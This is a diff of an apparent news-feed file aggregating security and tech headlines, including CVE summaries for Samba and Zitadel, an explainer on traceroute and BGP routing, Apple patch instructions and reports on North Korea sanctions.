@@ -403,7 +403,7 @@ A flaw was found in Samba, in the front-end WINS hook handling: NetBIOS names fr
  10.0 | CRITICAL
 
 Visit the link for more details, such as CVSS details, affected products, timeline, and more...
-]]></content:encoded></item><item><title>Apple is crossing a Steve Jobs red line</title><link>https://kensegall.com/2025/11/07/apple-is-crossing-a-steve-jobs-red-line/</link><author>zdw</author><category>dev</category><pubDate>Fri, 7 Nov 2025 20:05:32 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How did I get here?</title><link>https://how-did-i-get-here.net/</link><author>zachlatta</author><category>dev</category><pubDate>Fri, 7 Nov 2025 20:01:09 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[This part of the page is still loading while I wait for the above traceroute to load.To reach this website, your computer sent some packets across the Internet. If we’re curious what that path was, we can run a tool to generate a  — a rough list of every server your packets touched to reach their destination. To build this website (source code on GitHub), I wrote my own traceroute program called ktr (also open source) that can stream results in real time while concurrently looking up interesting information about each hop.How does ktr work? Let’s start with a simplified explanation of Internet routing.Starting with the source device, each computer that handles a packet has to choose the best device to forward it to — I will explain how these routing decisions are made in a bit. Assuming everything works correctly, the packet will eventually reach a router that knows how to send it directly to its destination.My traceroute implementation uses a protocol called ICMP. ICMP was designed specifically for sending diagnostic information around the Internet, and, helpfully, almost every Internet-connected device speaks it. Interestingly, ICMP packets have a “TTL” (time to live) field. This isn’t actually a “time” as implied by a name — it’s a countdown! Every time a router forwards an ICMP packet along, it’s supposed to decrement the TTL number. When the TTL hits zero, the router should stop forwarding it along and instead send an error message to the packet’s source IP saying that the packet has reached its maximum number of hops.We can take advantage of this TTL feature! To do a traceroute, we can send a bunch of ICMP packets with increasingly large TTLs. The first packet with a TTL of 1 will error on the first device it reaches, and so on, until we hopefully get an error back from every routing device that touched the packet. These error packets include diagnostic information like the IP address of the device that sent the error, allowing us to trace your packets’ rough path across the Internet.This page will work perfectly fine with JavaScript disabled. From the browser’s perspective, this website just loaded slowly. From your perspective, a traceroute magically loaded in.When you loaded this website, my program received a HTTP request coming from your IP address. It immediately started running a traceroute to your IP. Then, the server started responding to the HTTP request: it sent the beginning of this web page, and then it left the connection open. As ktr, my traceroute program, gave the server updates on your traceroute, it rendered the relevant HTML and sent it to your computer. When the traceroute finished, the server generated all the text and sent the rest of the website along the line before closing out the connection.You may have noticed that the traceroute progressively loads in lines above the bottom line. Web pages can only load forward. Since I didn’t want to use any JavaScript, I did the hackiest thing possible: every time I update the traceroute display, I embed a CSS block that hides the previous iteration! Since browsers render CSS as the page is loading, this made it look like the traceroute was being edited over time.Front to Back, Back to FrontMy claim that this website’s traceroute was the path your packets took to reach my server was a bit of a white lie. To calculate that, I would’ve had to be able to run a traceroute to my server  Instead, I ran the traceroute from my server to your computer and just reversed it. That’s also why the traceroute at the top seemingly loads in reverse order.Does running a “reverse traceroute” sacrifice accuracy? A little, actually.As I said when describing Internet routing, each device a packet traverses makes a decision about where to send the packet next until it reaches its final destination. If you send a packet in the other direction, the devices might make different routing decisions… and if one device makes one different decision, the rest of the path will certainly be different.This reverse traceroute is still helpful. The paths will be roughly the same, likely differing only in terms of which specific routers see your packet.So, What Are All Those Networks?This site began with talk about the “networks” you traversed to reach my server. What, concretely, are these networks?Each network, also called an autonomous system (AS), is a collection of routers and servers that are privately connected to each other and generally owned by the same company. The owners of these autonomous systems decide the shape of the Internet by choosing which other autonomous systems to connect to. Internet traffic travels across autonomous systems that have “peering arrangements” with each other.The Internet is often described as an open, almost anarchistic network connecting computers, some owned by people like you and me, and some owned by companies. In reality, the Internet is a network of corporation-owned networks, access and control to which is governed by financial transactions and dripping with bureaucracy.If you want your own autonomous system, you can apply for an autonomous system number (ASN) with one of the five regional Internet registries (RIRs) that govern the Internet’s numbers. Be warned, they probably won’t listen to you if you aren’t backed by a company or you don’t have enough points of presence on the Internet. Just like we use IP addresses to identify—Wait, what exactly do IP addresses identify? Uh… let’s say they represent devices with Internet access.… Just like we use IP addresses to identify devices with Internet access, we use ASNs to identify the networks of the Internet. One of the reasons I wrote a cool traceroute program myself is so I could pull information on which autonomous systems own the IPs along your traceroute. A couple of organizations try to keep track of which ASes contain which IP addresses. Many of them let you perform ASN lookups using the WHOIS protocol, so I wrote a small client to parse the responses from some servers I arbitrarily selected.I then used this cool database called PeeringDB to figure out the companies behind the ASNs; PeeringDB has information on about 1/3rd of all autonomous systems. I used all of this information, alongside a couple hundred lines of if statements, to generate the text about network traversal for you.WHOIS is actually an... interesting protocol to make a parser for. It turns out that the WHOIS protocol specification doesn't actually specify much. It specifies that you should make a TCP connection to the WHOIS server, send whatever you want to look up, and the server will send back some info and then terminate the connection. That’s all.And yet, a lot of WHOIS servers will respond with structured-seeming information:It turns out this structure is made up by the WHOIS server administrator and there just happen to be some shared conventions between servers. Even with the level of structure, the fields you want often show up with different names (origin? originas?) or even under multiple places at once.My “parser” ended up as less of a parser and more as a lightweight simulator of how I, a human, might read through WHOIS results to find the ASN I need.When you send a packet across the Internet, routers sitting at the borders where these networks connect decide which network to send your packet to next, until it reaches the network that contains the destination device.These border routers talk to each other about which networks they’re able to connect to using a protocol called Border Gateway Protocol (BGP).In 1969, the same year Neil Armstrong landed on the moon, a message was (partially) sent on a prototype of the ARPANET. Over the next 20 years, this “network of interconnected computers” thing got pretty popular and everyone wanted on the train. Various universities, government agencies, and a couple random companies started making networks of their computers left and right.A couple of these organizations started connecting their networks together so they could share data more easily. The Internet as we know it didn’t exist yet, but these network interconnections were getting out of hand and there wasn’t a great standard for coordinating them. In 1989, engineers at Cisco and IBM published RFC 1105, describing the first ever version of BGP.Over the next couple of years, interconnected-network people got really busy as “the Internet” rapidly became a thing. Just one year after the BGP v1 RFC, Cisco went public and brought a lot of money into the networking industry, the term “IANA” was first used to refer to the random guy and his college department that were keeping track of numbers on the Internet, ARPANET shut down for good, and BGP v2 was released.In 1994, as the Internet-is-a-thing-now whirlwind was just beginning to calm, the final major version of BGP, v4, was specified in RFC 1654. It was revised twice (in 1995 and 2006) and got some patches, but BGP v4 is still the protocol we use for choosing routes across the interconnected networks that make up the modern Internet.How Does This BGP Thing Work?Routers at the borders between autonomous systems (“border gateways”) keep a list of every  they know about, called a . Each BGP route specifies the path of ASNs that could be followed to reach an autonomous system that controls a certain collection of IP addresses.These routes across the Internet are formed by  between autonomous systems. When the border gateways of two autonomous systems , they are typically agreeing to:Allow traffic to travel between the two routers, meaning BGP routes can go directly between the two ASNs.Keep each other up to date about the BGP routes they know about.Example time! Router A of AS0001 is physically connected with Router B of AS0002 and they want to peer with each other. They send BGP messages to each other to establish a . Router A now knows that it should go through Router B for any BGP route that starts with AS0002, and vice versa.BGP peers share the routes they know about with each other in a process called . In our above example, when Router A connects to Router B, it would tell Router B “hey, here are all the routes I know about, you can go through my ASN (and by extension, me) to reach all of them.” Router B adds all of those routes through Router A — so, starting with AS0001 — to its routing table. Whenever another one of Router A’s peers advertises a new route, Router A will advertise those forward to Router B.AS0001 probably directly controls some IP addresses itself. Router A would advertise those to Router B as well. Router B would then, in turn, advertise those direct routes forward, telling  peers that AS0002 → AS0001 is a valid route to reach those IPs. Through this process of forwarding route advertisements to peers, BGP routes are propagated across the entire network of autonomous systems such that any border gateway hopefully knows one or multiple AS paths to reach any IP on the Internet.To route a packet to a certain IP, a border gateway first searches its routing table for every route that would bring it to an AS that controls that IP. The router then picks the “best” route by various heuristics that include looking for the shortest path and weighing hardcoded preferences for or against certain autonomous systems. Finally, it routes the packet to the first AS in that path by sending it to that AS’s gateway router which it is peered with. That router, in turn, looks at its own routing table and makes its own decision about where to send the packet next.When you loaded this website, it used my custom traceroute program to run a traceroute to your public IP (), stream that over HTTP, and then render a textual explanation of the traceroute.A traceroute depicts the path of routers traversed between two devices on the Internet. My particular implementation works by sending ICMP packets with increasing TTL fields.These routers are in networks called autonomous systems. Routers on the edges of these ASes peer with each other using BGP. Border routers use BGP to share their routing tables with each other, and then use this knowledge to make routing decisions.BGP peering sessions are created according to (often private) arrangements between the owners of autonomous systems. Since traffic can only pass between peered networks, these arrangements are the sole governor of reachability on the Internet.I was frustrated with the state of understanding on the structure of the Internet and sought to write a comprehensive, interactive article covering its history and politics through the lens of protocols. However, I got caught up in a lot of complexity in life and, facing tight deadlines, didn't have the time to reach the lofty goals I had set for myself.Thanks to the encouragement of my friends at Hack Club, I made the best out of what I had. “Better to ship a tiny raft than never ship that cruise yacht!” If nothing else, I got to make use of the sick ass traceroute program that powers the shiniest part of this site :)I hope this serves as another fun, informative, and well-crafted thing on the web that can last, be shared around, and inspire people.Some things to check out:]]></content:encoded></item><item><title>Microsoft testing faster Quick Machine Recovery in Windows 11</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-testing-faster-quick-machine-recovery-in-windows-11/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 7 Nov 2025 19:46:32 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft is testing a faster version of Quick Machine Recovery (QMR) and updated Smart App Control (SAC), allowing users to toggle it without requiring a Windows clean install. [...]]]></content:encoded></item><item><title>Free IOC tool</title><link>https://nexussentinel.allitsystems.com/</link><author>/u/Cute_Leading_3759</author><category>netsec</category><pubDate>Fri, 7 Nov 2025 19:39:37 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Integrated security operations platform combining network diagnostics with multi-source threat intelligence analysis. Real-time IOC validation and comprehensive network toolkit for security analysts and network engineers.AUTO-DETECTED: IP ADDRESSSCAN TIMESTAMP: 2025-11-07T12:45:32ZRISK SCORE: 85/100 | ACTION: BLOCK IMMEDIATELYTHREAT INDICATORS DETECTED High confidence malicious classification Multiple detection events recorded 88% abuse confidence score Flagged by 12 security vendorsBATCH SCANNING & EXPORT FEATURESProcess multiple IOCs at once and export results. Login required for batch scanning and data export.Upload suspicious files for analysis. Calculate hashes, check against VirusTotal, MalwareBazaar, and more. Generates detailed threat reports.Paste suspicious email headers or content for analysis. Checks SPF/DKIM/DMARC, extracts URLs, detects phishing indicators, and generates risk score.View malware and phishing analysis trends. Track threat levels, top malware families, sender domains, and detection rates over time.]]></content:encoded></item><item><title>James Watson has died</title><link>https://www.nytimes.com/2025/11/07/science/james-watson-dead.html</link><author>granzymes</author><category>dev</category><pubDate>Fri, 7 Nov 2025 19:30:18 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-64431 - IDOR Vulnerabilities in ZITADEL&apos;s Organization API allows Cross-Tenant Data Tempering</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64431</link><author></author><category>vulns</category><pubDate>Fri, 7 Nov 2025 19:16:26 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64431
+]]></content:encoded></item><item><title>Apple is crossing a Steve Jobs red line</title><link>https://kensegall.com/2025/11/07/apple-is-crossing-a-steve-jobs-red-line/</link><author>zdw</author><category>dev</category><pubDate>Fri, 7 Nov 2025 20:05:32 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>How did I get here?</title><link>https://how-did-i-get-here.net/</link><author>zachlatta</author><category>dev</category><pubDate>Fri, 7 Nov 2025 20:01:09 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[This part of the page is still loading while I wait for the above traceroute to load.To reach this website, your computer sent some packets across the Internet. If we’re curious what that path was, we can run a tool to generate a  — a rough list of every server your packets touched to reach their destination. To build this website (source code on GitHub), I wrote my own traceroute program called ktr (also open source) that can stream results in real time while concurrently looking up interesting information about each hop.How does ktr work? Let’s start with a simplified explanation of Internet routing.Starting with the source device, each computer that handles a packet has to choose the best device to forward it to — I will explain how these routing decisions are made in a bit. Assuming everything works correctly, the packet will eventually reach a router that knows how to send it directly to its destination.My traceroute implementation uses a protocol called ICMP. ICMP was designed specifically for sending diagnostic information around the Internet, and, helpfully, almost every Internet-connected device speaks it. Interestingly, ICMP packets have a “TTL” (time to live) field. This isn’t actually a “time” as implied by a name — it’s a countdown! Every time a router forwards an ICMP packet along, it’s supposed to decrement the TTL number. When the TTL hits zero, the router should stop forwarding it along and instead send an error message to the packet’s source IP saying that the packet has reached its maximum number of hops.We can take advantage of this TTL feature! To do a traceroute, we can send a bunch of ICMP packets with increasingly large TTLs. The first packet with a TTL of 1 will error on the first device it reaches, and so on, until we hopefully get an error back from every routing device that touched the packet. These error packets include diagnostic information like the IP address of the device that sent the error, allowing us to trace your packets’ rough path across the Internet.This page will work perfectly fine with JavaScript disabled. From the browser’s perspective, this website just loaded slowly. From your perspective, a traceroute magically loaded in.When you loaded this website, my program received a HTTP request coming from your IP address. It immediately started running a traceroute to your IP. Then, the server started responding to the HTTP request: it sent the beginning of this web page, and then it left the connection open. As ktr, my traceroute program, gave the server updates on your traceroute, it rendered the relevant HTML and sent it to your computer. When the traceroute finished, the server generated all the text and sent the rest of the website along the line before closing out the connection.You may have noticed that the traceroute progressively loads in lines above the bottom line. Web pages can only load forward. Since I didn’t want to use any JavaScript, I did the hackiest thing possible: every time I update the traceroute display, I embed a CSS block that hides the previous iteration! Since browsers render CSS as the page is loading, this made it look like the traceroute was being edited over time.Front to Back, Back to FrontMy claim that this website’s traceroute was the path your packets took to reach my server was a bit of a white lie. To calculate that, I would’ve had to be able to run a traceroute to my server  Instead, I ran the traceroute from my server to your computer and just reversed it. That’s also why the traceroute at the top seemingly loads in reverse order.Does running a “reverse traceroute” sacrifice accuracy? A little, actually.As I said when describing Internet routing, each device a packet traverses makes a decision about where to send the packet next until it reaches its final destination. If you send a packet in the other direction, the devices might make different routing decisions… and if one device makes one different decision, the rest of the path will certainly be different.This reverse traceroute is still helpful. The paths will be roughly the same, likely differing only in terms of which specific routers see your packet.So, What Are All Those Networks?This site began with talk about the “networks” you traversed to reach my server. What, concretely, are these networks?Each network, also called an autonomous system (AS), is a collection of routers and servers that are privately connected to each other and generally owned by the same company. The owners of these autonomous systems decide the shape of the Internet by choosing which other autonomous systems to connect to. Internet traffic travels across autonomous systems that have “peering arrangements” with each other.The Internet is often described as an open, almost anarchistic network connecting computers, some owned by people like you and me, and some owned by companies. In reality, the Internet is a network of corporation-owned networks, access and control to which is governed by financial transactions and dripping with bureaucracy.If you want your own autonomous system, you can apply for an autonomous system number (ASN) with one of the five regional Internet registries (RIRs) that govern the Internet’s numbers. Be warned, they probably won’t listen to you if you aren’t backed by a company or you don’t have enough points of presence on the Internet. Just like we use IP addresses to identify—Wait, what exactly do IP addresses identify? Uh… let’s say they represent devices with Internet access.… Just like we use IP addresses to identify devices with Internet access, we use ASNs to identify the networks of the Internet. One of the reasons I wrote a cool traceroute program myself is so I could pull information on which autonomous systems own the IPs along your traceroute. A couple of organizations try to keep track of which ASes contain which IP addresses. Many of them let you perform ASN lookups using the WHOIS protocol, so I wrote a small client to parse the responses from some servers I arbitrarily selected.I then used this cool database called PeeringDB to figure out the companies behind the ASNs; PeeringDB has information on about 1/3rd of all autonomous systems. I used all of this information, alongside a couple hundred lines of if statements, to generate the text about network traversal for you.WHOIS is actually an... interesting protocol to make a parser for. It turns out that the WHOIS protocol specification doesn't actually specify much. It specifies that you should make a TCP connection to the WHOIS server, send whatever you want to look up, and the server will send back some info and then terminate the connection. That’s all.And yet, a lot of WHOIS servers will respond with structured-seeming information:It turns out this structure is made up by the WHOIS server administrator and there just happen to be some shared conventions between servers. Even with the level of structure, the fields you want often show up with different names (origin? originas?) or even under multiple places at once.My “parser” ended up as less of a parser and more as a lightweight simulator of how I, a human, might read through WHOIS results to find the ASN I need.When you send a packet across the Internet, routers sitting at the borders where these networks connect decide which network to send your packet to next, until it reaches the network that contains the destination device.These border routers talk to each other about which networks they’re able to connect to using a protocol called Border Gateway Protocol (BGP).In 1969, the same year Neil Armstrong landed on the moon, a message was (partially) sent on a prototype of the ARPANET. Over the next 20 years, this “network of interconnected computers” thing got pretty popular and everyone wanted on the train. Various universities, government agencies, and a couple random companies started making networks of their computers left and right.A couple of these organizations started connecting their networks together so they could share data more easily. The Internet as we know it didn’t exist yet, but these network interconnections were getting out of hand and there wasn’t a great standard for coordinating them. In 1989, engineers at Cisco and IBM published RFC 1105, describing the first ever version of BGP.Over the next couple of years, interconnected-network people got really busy as “the Internet” rapidly became a thing. Just one year after the BGP v1 RFC, Cisco went public and brought a lot of money into the networking industry, the term “IANA” was first used to refer to the random guy and his college department that were keeping track of numbers on the Internet, ARPANET shut down for good, and BGP v2 was released.In 1994, as the Internet-is-a-thing-now whirlwind was just beginning to calm, the final major version of BGP, v4, was specified in RFC 1654. It was revised twice (in 1995 and 2006) and got some patches, but BGP v4 is still the protocol we use for choosing routes across the interconnected networks that make up the modern Internet.How Does This BGP Thing Work?Routers at the borders between autonomous systems (“border gateways”) keep a list of every  they know about, called a . Each BGP route specifies the path of ASNs that could be followed to reach an autonomous system that controls a certain collection of IP addresses.These routes across the Internet are formed by  between autonomous systems. When the border gateways of two autonomous systems , they are typically agreeing to:Allow traffic to travel between the two routers, meaning BGP routes can go directly between the two ASNs.Keep each other up to date about the BGP routes they know about.Example time! Router A of AS0001 is physically connected with Router B of AS0002 and they want to peer with each other. They send BGP messages to each other to establish a . Router A now knows that it should go through Router B for any BGP route that starts with AS0002, and vice versa.BGP peers share the routes they know about with each other in a process called . In our above example, when Router A connects to Router B, it would tell Router B “hey, here are all the routes I know about, you can go through my ASN (and by extension, me) to reach all of them.” Router B adds all of those routes through Router A — so, starting with AS0001 — to its routing table. Whenever another one of Router A’s peers advertises a new route, Router A will advertise those forward to Router B.AS0001 probably directly controls some IP addresses itself. Router A would advertise those to Router B as well. Router B would then, in turn, advertise those direct routes forward, telling  peers that AS0002 → AS0001 is a valid route to reach those IPs. Through this process of forwarding route advertisements to peers, BGP routes are propagated across the entire network of autonomous systems such that any border gateway hopefully knows one or multiple AS paths to reach any IP on the Internet.To route a packet to a certain IP, a border gateway first searches its routing table for every route that would bring it to an AS that controls that IP. The router then picks the “best” route by various heuristics that include looking for the shortest path and weighing hardcoded preferences for or against certain autonomous systems. Finally, it routes the packet to the first AS in that path by sending it to that AS’s gateway router which it is peered with. That router, in turn, looks at its own routing table and makes its own decision about where to send the packet next.When you loaded this website, it used my custom traceroute program to run a traceroute to your public IP (), stream that over HTTP, and then render a textual explanation of the traceroute.A traceroute depicts the path of routers traversed between two devices on the Internet. My particular implementation works by sending ICMP packets with increasing TTL fields.These routers are in networks called autonomous systems. Routers on the edges of these ASes peer with each other using BGP. Border routers use BGP to share their routing tables with each other, and then use this knowledge to make routing decisions.BGP peering sessions are created according to (often private) arrangements between the owners of autonomous systems. Since traffic can only pass between peered networks, these arrangements are the sole governor of reachability on the Internet.I was frustrated with the state of understanding on the structure of the Internet and sought to write a comprehensive, interactive article covering its history and politics through the lens of protocols. However, I got caught up in a lot of complexity in life and, facing tight deadlines, didn't have the time to reach the lofty goals I had set for myself.Thanks to the encouragement of my friends at Hack Club, I made the best out of what I had. “Better to ship a tiny raft than never ship that cruise yacht!” If nothing else, I got to make use of the sick ass traceroute program that powers the shiniest part of this site :)I hope this serves as another fun, informative, and well-crafted thing on the web that can last, be shared around, and inspire people.Some things to check out:]]></content:encoded></item><item><title>Microsoft testing faster Quick Machine Recovery in Windows 11</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-testing-faster-quick-machine-recovery-in-windows-11/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 7 Nov 2025 19:46:32 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft is testing a faster version of Quick Machine Recovery (QMR) and updated Smart App Control (SAC), allowing users to toggle it without requiring a Windows clean install. [...]]]></content:encoded></item><item><title>Free IOC tool</title><link>https://nexussentinel.allitsystems.com/</link><author>/u/Cute_Leading_3759</author><category>netsec</category><pubDate>Fri, 7 Nov 2025 19:39:37 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Integrated security operations platform combining network diagnostics with multi-source threat intelligence analysis. Real-time IOC validation and comprehensive network toolkit for security analysts and network engineers.AUTO-DETECTED: IP ADDRESSSCAN TIMESTAMP: 2025-11-07T12:45:32ZRISK SCORE: 85/100 | ACTION: BLOCK IMMEDIATELYTHREAT INDICATORS DETECTED High confidence malicious classification Multiple detection events recorded 88% abuse confidence score Flagged by 12 security vendorsBATCH SCANNING & EXPORT FEATURESProcess multiple IOCs at once and export results. Login required for batch scanning and data export.Upload suspicious files for comprehensive malware analysis. Checks against multiple threat intelligence sources, identifies malware families and threat actors, and generates detailed threat reports.Paste suspicious email headers or content for analysis. Checks SPF/DKIM/DMARC, extracts URLs, detects phishing indicators, and generates risk score.View malware and phishing analysis trends. Track threat levels, top malware families, sender domains, and detection rates over time.]]></content:encoded></item><item><title>James Watson has died</title><link>https://www.nytimes.com/2025/11/07/science/james-watson-dead.html</link><author>granzymes</author><category>dev</category><pubDate>Fri, 7 Nov 2025 19:30:18 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-64431 - IDOR Vulnerabilities in ZITADEL&apos;s Organization API allows Cross-Tenant Data Tempering</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64431</link><author></author><category>vulns</category><pubDate>Fri, 7 Nov 2025 19:16:26 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64431
  Nov. 7, 2025, 7:16 p.m. | 12 hours, 38 minutes ago
 Zitadel is an open source identity management platform. Versions 4.0.0-rc.1 through 4.6.2 are vulnerable to secure Direct Object Reference (IDOR) attacks through its V2Beta API, allowing authenticated users with specific administrator roles within one organization to access and modify data belonging to other organizations. Note that this vulnerability is limited to organization-level data (name, domains, metadata). No other related data (such as users, projects, applications, etc.) is affected. This issue is fixed in version 4.6.3.
  8.7 | HIGH
@@ -1628,7 +1628,846 @@ Android phones, such as the Samsung Galaxy, unlock new ways of working. But, as 
 However, outdated concerns can hold your business back from unlocking its full potential. The truth is, with work happening everywhere, every device connected to your]]></content:encoded></item><item><title>Mysterious &apos;SmudgedSerpent&apos; Hackers Target U.S. Policy Experts Amid Iran–Israel Tensions</title><link>https://thehackernews.com/2025/11/mysterious-smudgedserpent-hackers.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmp-SI1cgUsmlMG3lE9_zYqMARsZ452j97kJNlUe_E0cqUX6QHXfPp6-pMHEQZuKlr8mzJI004vOCYTQVaygW0V7Mlcd2hmwk599TNk-85utedJE9cPyZO_ezKR3E-THcjGP8xeVc3udXnrCz6OFT8OCqVaZY6xry3kbsJmCJmdcq-Gz9lrUigoyNbEWhz/s1600/hacker-uk.jpg" length="" type=""/><pubDate>Wed, 5 Nov 2025 11:20:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[A never-before-seen threat activity cluster codenamed UNK_SmudgedSerpent has been attributed as behind a set of cyber attacks targeting academics and foreign policy experts between June and August 2025, coinciding with heightened geopolitical tensions between Iran and Israel.
 "UNK_SmudgedSerpent leveraged domestic political lures, including societal change in Iran and investigation into the]]></content:encoded></item><item><title>Apple patches 50 security flaws—update now</title><link>https://www.malwarebytes.com/blog/news/2025/11/apple-patches-50-security-flaws-update-now</link><author></author><category>threatintel</category><pubDate>Wed, 5 Nov 2025 11:14:53 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Apple has released security updates for iPhones, iPads, Macs, Apple Watches, Apple TVs, Safari, and Xcode, fixing nearly 50 security flaws. Some of these bugs could let cybercriminals see your private data, take control of parts of your device, or break key security protections.Installing these updates as soon as possible keeps your personal information—and everything else on your Apple devices—safe from attack.Although Apple never releases full details before everyone has had a chance to apply the updates, two serious security flaws stand out:This vulnerability is a permission issue which is fixed in iOS 26.1 and iPadOS 26.1. It could allow an app to identify which other apps a user has installed. You can imagine that if a banking Trojan—like this one on Android—can see which banking apps and crypto wallets someone uses they can maximize their social engineering strategies to target that user. This is a privacy issue in watchOS 26.1, visionOS 26.1, iOS 26.1, and iPadOS 26.1. It allows malicious apps to capture screenshots of sensitive information in embedded views. Apple addressed this by tightening privacy checks and isolation policies.Updates for your particular deviceThis table shows which updates are available and points you to the relevant security content fot that operating system (OS).How to update your devicesHow to update your iPhone or iPadFor iOS and iPadOS users, here’s how to check if you’re using the latest software version:Go to  >  > . Turn on  if you haven’t already—you’ll find it on the same screen.How to update macOS on any versionTo update macOS on any supported Mac, use the Software Update feature, which Apple designed to work consistently across all recent versions. Here are the steps:Click the Apple menu in the upper-left corner of your screen.Choose  (or  on older versions).Select  in the sidebar, then click  on the right. On older macOS, just look for  directly.Your Mac will check for updates automatically. If updates are available, click  (or  for major new versions) and follow the on-screen instructions. Before you upgrade to macOS Tahoe 26, please read these instructions.Enter your administrator password if prompted, then let your Mac finish the update (it might need to restart during this process).Make sure your Mac stays plugged in and connected to the internet until the update is done.How to update Apple WatchEnsure your iPhone is paired with your Apple Watch and connected to Wi-Fi, then:Keep your Apple Watch on its charger and close to your iPhone.Open the Watch app on your iPhone.Tap >.If an update appears, tap .Enter your iPhone passcode or Apple ID password if prompted.Your Apple Watch will automatically restart during the update process. Make sure it remains near your iPhone and on charge until the update completes.Turn on your Apple TV and make sure it’s connected to the internet, then:Open the Settings app on Apple TV.Navigate >.If an update appears, select .The Apple TV will download the update and restart as needed. Keep your device connected to power and Wi-Fi until the process finishes.How to update your Safari browserSafari updates are included with macOS updates, so installing the latest version of macOS will also update Safari. To check manually:Open the >>>.If you see a Safari update listed separately, click  to install it.Restart your Mac when prompted.If you’re on an older macOS version that’s still supported (like Sonoma or Sequoia), Apple may offer Safari updates independently through Software Update.Xcode is Apple’s developer tool for building apps, so most people won’t have this, but if you do, you’ll need to keep it updated. Xcode updates come through the :Open the  on your Mac.Click  in the sidebar.If an Xcode update is available, click  next to it.You can also search for “Xcode” directly and click  or  if you’ve uninstalled it.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>U.S. Sanctions 10 North Korean Entities for Laundering $12.7M in Crypto and IT Fraud</title><link>https://thehackernews.com/2025/11/us-sanctions-10-north-korean-entities.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiXIMlJnqx7E3-6UYncV_kGW3LUD3e8ePPnKZ2nWmTSdjlvSMeVGwCwVaJQCYk6KCKcvnmiu1_Ujh_eqgtEJ3JYO2-FVzKTcDFiw5wmXacWEMwFhc3VtV8ZTenImisM-4talaTVCUqZHk1rxXoqY6b4kyHTh53q_OjRYj_MTznsoqhgb_0B8QAVWRc_KVV2/s1600/it-workers.jpg" length="" type=""/><pubDate>Wed, 5 Nov 2025 10:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The U.S. Treasury Department on Tuesday imposed sanctions against eight individuals and two entities within North Korea's global financial network for laundering money for various illicit schemes, including cybercrime and information technology (IT) worker fraud.
 "North Korean state-sponsored hackers steal and launder money to fund the regime's nuclear weapons program," said Under Secretary of]]></content:encoded></item><item><title>US sanctions North Korean bankers linked to cybercrime, IT worker fraud</title><link>https://www.bleepingcomputer.com/news/security/us-treasury-sanctions-north-korean-bankers-linked-to-cybercrime-it-worker-fraud/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Wed, 5 Nov 2025 10:34:38 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[The U.S. Treasury Department imposed sanctions on two North Korean financial institutions and eight individuals involved in laundering cryptocurrency stolen in cybercrime and fraudulent IT worker schemes. [...]]]></content:encoded></item><item><title>Why SOC Burnout Can Be Avoided: Practical Steps</title><link>https://thehackernews.com/2025/11/why-soc-burnout-can-be-avoided.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2Typv0FhA4kzN6hRhuRsYCb7CNG7u5iId8CN_KCFj3ZCliQ0deQbIUQpJYkupf0dtKZulkLGCahDh0hfY9Ofs3PM5YCMyAnYmQH7ctyr79puTU3l6eOj6BWCt8y1bj_EI0rdT6zYrBeb_qwGuUNCBfIRtLABG51Dpr6SyxoNaV3Xj8QS-ZU01ie7jxEc/s1600/anyrun.jpg" length="" type=""/><pubDate>Wed, 5 Nov 2025 10:30:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Behind every alert is an analyst; tired eyes scanning dashboards, long nights spent on false positives, and the constant fear of missing something big. It’s no surprise that many SOCs face burnout before they face their next breach. But this doesn’t have to be the norm. The path out isn’t through working harder, but through working smarter, together.
